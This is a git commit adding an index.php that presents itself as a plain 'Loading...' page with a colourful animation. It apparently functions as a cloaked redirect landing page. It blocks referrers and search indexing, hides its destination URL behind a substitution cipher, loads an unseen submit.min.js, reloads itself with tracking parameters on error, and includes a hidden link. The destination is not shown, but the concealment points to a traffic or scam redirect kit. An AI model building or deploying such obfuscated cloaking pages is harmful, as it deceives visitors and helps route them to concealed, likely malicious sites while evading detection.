d002d757b2dd0a318b4644359b442a6114c4a5ce
Duc Minh Vu <49747753+muzannopro@users.noreply.github.com>
2025-02-25 22:54:14 +0700

    first

---
+++ index.php
@@ -0,0 +1,251 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta name="referrer" content="never">
+    <meta name="referrer" content="no-referrer">
+    <meta name="robots" content="noindex, nofollow, notranslate, noarchive">
+    <meta name="google" content="nopagereadaloud">
+    <link rel="preconnect dns-prefetch" href="https://google.com" />
+    <title>Loading...</title>
+    <link rel="icon" type="image/png" href="data:image/png;base64,iVBORw0KGgo=">
+    <style>
+        .c {
+            display: none
+        }
+
+        @keyframes s {
+            0% {
+                transform: rotate(0)
+            }
+
+            100% {
+                transform: rotate(360deg)
+            }
+        }
+
+        #loader {
+            background-color: #fff;
+            display: -webkit-box;
+            display: -webkit-flex;
+            display: -moz-box;
+            display: -ms-flexbox;
+            display: flex;
+            -webkit-flex-wrap: wrap;
+            -ms-flex-wrap: wrap;
+            flex-wrap: wrap;
+            margin: 0 auto
+        }
+
+        #loader div {
+            width: 20px;
+            height: 20px;
+            margin-top: 1px;
+            margin-right: 1px;
+            float: left;
+            -webkit-animation: 1s linear var(--delay) loader infinite;
+            -moz-animation: 1s linear var(--delay) loader infinite;
+            -o-animation: 1s linear var(--delay) loader infinite;
+            animation: 1s linear var(--delay) loader infinite;
+            -webkit-transition: transform .2s ease-out;
+            -o-transition: transform .2s ease-out;
+            -moz-transition: transform .2s ease-out;
+            transition: transform .2s ease-out
+        }
+
+        #loader .c0 {
+            background-color: pink
+        }
+
+        #loader .c1 {
+            background-color: orange
+        }
+
+        #loader .c2 {
+            background-color: red
+        }
+
+        #loader .c3 {
+            background-color: #dfdfdf
+        }
+
+        #loader .c4 {
+            background-color: olive
+        }
+
+        #loader .c5 {
+            background-color: #32cd32
+        }
+
+        #loader .c6 {
+            background-color: #41ff00
+        }
+
+        #loader .c7 {
+            background-color: #0ff
+        }
+
+        #loader .c8 {
+            background-color: #91cfff
+        }
+
+        #loader .c9 {
+            background-color: #00f
+        }
+
+        #loader .c10 {
+            background-color: purple
+        }
+
+        #loader .c11 {
+            background-color: #f0f
+        }
+
+        #loader .c12 {
+            background-color: #bb7232
+        }
+
+        #loader .c13 {
+            background-color: #ff0
+        }
+
+        #loader .c14 {
+            background-color: #2db6b7
+        }
+
+        #loader .c15 {
+            background-color: #000
+        }
+
+        @-webkit-keyframes loader {
+
+            0%,
+            15% {
+                -webkit-transform: scale(.5);
+                transform: scale(.5)
+            }
+
+            30%,
+            70% {
+                -webkit-transform: scale(1);
+                transform: scale(1)
+            }
+
+            100%,
+            85% {
+                -webkit-transform: scale(.5);
+                transform: scale(.5)
+            }
+        }
+
+        @-moz-keyframes loader {
+
+            0%,
+            15% {
+                -moz-transform: scale(.5);
+                transform: scale(.5)
+            }
+
+            30%,
+            70% {
+                -moz-transform: scale(1);
+                transform: scale(1)
+            }
+
+            100%,
+            85% {
+                -moz-transform: scale(.5);
+                transform: scale(.5)
+            }
+        }
+
+        @-o-keyframes loader {
+
+            0%,
+            15% {
+                -o-transform: scale(.5);
+                transform: scale(.5)
+            }
+
+            30%,
+            70% {
+                -o-transform: scale(1);
+                transform: scale(1)
+            }
+
+            100%,
+            85% {
+                -o-transform: scale(.5);
+                transform: scale(.5)
+            }
+        }
+
+        @keyframes loader {
+
+            0%,
+            15% {
+                -webkit-transform: scale(.5);
+                -moz-transform: scale(.5);
+                -o-transform: scale(.5);
+                transform: scale(.5)
+            }
+
+            30%,
+            70% {
+                -webkit-transform: scale(1);
+                -moz-transform: scale(1);
+                -o-transform: scale(1);
+                transform: scale(1)
+            }
+
+            100%,
+            85% {
+                -webkit-transform: scale(.5);
+                -moz-transform: scale(.5);
+                -o-transform: scale(.5);
+                transform: scale(.5)
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div style="display: flex; min-height: 100vh; align-items: center; justify-content: center">
+        <div id="loader" style="width: 84px;">
+            <div style="--delay:0.2s;" class="c6"></div>
+            <div style="--delay:0.3s;" class="c7"></div>
+            <div style="--delay:0.4s;" class="c3"></div>
+            <div style="--delay:0.5s;" class="c3"></div>
+            <div style="--delay:0.3s;" class="c7"></div>
+            <div style="--delay:0.4s;" class="c9"></div>
+            <div style="--delay:0.5s;" class="c7"></div>
+            <div style="--delay:0.6s;" class="c10"></div>
+            <div style="--delay:0.4s;" class="c0"></div>
+            <div style="--delay:0.5s;" class="c0"></div>
+            <div style="--delay:0.6s;" class="c14"></div>
+            <div style="--delay:0.7s;" class="c5"></div>
+            <div style="--delay:0.5s;" class="c15"></div>
+            <div style="--delay:0.6s;" class="c1"></div>
+            <div style="--delay:0.7s;" class="c9"></div>
+            <div style="--delay:0.8s;" class="c2"></div>
+            <p style="width: 100%;text-align: center;margin: 6px 0 0;font-size: 14px;font-family: sans-serif;clear:both;"> Loading...</p>
+        </div>
+    </div>
+    <script type = "text/javascript" >
+            var options = '{RZIn:f6mhmri,RVIn:f6f0d66,B7xb: "u551x://j297nztqs4bj9asl2beyxbn.893/2/ny2?g9lbyn=f6f0d66&1j=fp0drm0jd7dw7b0v76r0mmrmj7jfvrimmdrmirrhhf&1j8=rCnFNalj8db7zTNl&1js=VTznD_N5rwc7zTNl&1x1=2F-HjXJ3_k2tqznoYpXY11WEYcd_8maGTaY6n1J50QaVJ5KF8qhSVQxTgKGXcD97t2PwUw1TMsyc1ezVuli4WC99idnFOUlbs3QGMN5vqcNTeZRNdlgiaNh32AI93E4ofnkP00phb9rVXSen1eZjcQs-BUQPLqXgsKpOZ0lsdqZRTRiOpixHvKudV5KYTbV4lsh5A3SqiViMSVgg_AJEr9MHmpsafwiODqtva-hahWD2bWThjKiaOe4=&vnz=m",P21S28: ""}',
+            lary = 'abcdefghijklmnopqrstuvwxyz01234567897j8nbvouyq4z3l91c2x5sekatg6mfri0wdhp';
+
+            function onError() {
+                u = new URLSearchParams(window.location.search);
+                if (!u.has('rl')) {
+                u.set('ab', '8');
+                u.set('rl', '1');
+                window.location.search = u;
+                }
+            };
+    </script>
+    <script src="/submit.min.js?abvar=" type="text/javascript" onerror="onError()"></script>
+    <a href="/r/bl/2025700" class="c">click</a>
+</body>
+
+</html>
